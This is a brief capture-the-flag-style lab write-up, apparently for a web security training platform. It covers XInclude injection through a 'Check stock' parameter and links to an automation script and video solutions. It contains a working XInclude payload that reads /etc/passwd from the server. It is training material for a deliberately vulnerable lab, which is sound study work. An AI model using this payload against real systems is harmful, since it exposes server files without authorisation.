# Lab 7: Exploiting XInclude to retrieve files

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.

## Solution
> Manual Exploitation
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Set the value of the productId parameter to:
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

> Automating the process
- [Script](https://github.com/darshannn10/PortSwiggers-Web-Sec-Academy/blob/main/XXE%20Injection/lab-07/lab-07-script.py)

## Video Solution
- [Sommer's Video](https://youtu.be/PrlUHmjnyTQ)
- [Seven Seas Security's Video](https://youtu.be/uY9nFxsbbOs)
